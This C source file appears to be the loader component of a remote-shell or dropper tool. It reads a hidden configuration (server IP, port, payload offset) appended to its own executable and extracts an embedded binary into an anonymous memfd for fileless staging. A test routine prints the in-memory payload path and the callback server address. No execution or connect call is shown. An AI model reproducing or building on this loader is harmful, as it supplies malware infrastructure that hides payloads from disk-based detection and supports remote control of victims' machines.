#define _GNU_SOURCE
#include "shell.h"
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>

static shell_data_t data_cache;

void getshellinfo()
{
    static bool fetched;
    if (!fetched)
    {
        FILE *fp = fopen("/proc/self/exe", "rb");
        fseek(fp, 0 - sizeof(shell_data_t), SEEK_END);
        fread(&data_cache, sizeof(shell_data_t), 1, fp);
        fclose(fp);
        fetched = true;
    }
}

int extractbin()
{
    getshellinfo();
    int memfd = memfd_create("", MFD_CLOEXEC);
    FILE *selffd = fopen("/proc/self/exe", "rb");
    fseek(selffd, 0, SEEK_END);
    long filesize = ftell(selffd) - data_cache.offset - sizeof(shell_data_t);
    fseek(selffd, data_cache.offset, SEEK_SET);
    uint8_t *buffer = calloc(sizeof(uint8_t), filesize);
    size_t readsize = fread(buffer, sizeof(uint8_t), filesize, selffd);
    fclose(selffd);
    write(memfd, buffer, readsize);
    free(buffer);
    return memfd;
}

in_addr_t getserveraddr()
{
    getshellinfo();
    return data_cache.addr;
}

in_port_t getserverport()
{
    getshellinfo();
    return data_cache.port;
}

void shell_test()
{
    getshellinfo();
    printf("[memfd] Offset: %d Path: /proc/%d/fd/%d\n", data_cache.offset, getpid(), extractbin());
    struct in_addr temp;
    temp.s_addr = data_cache.addr;
    printf("[server] Addr: %s Port: %d\n", inet_ntoa(temp), ntohs(data_cache.port));
    getchar();
}
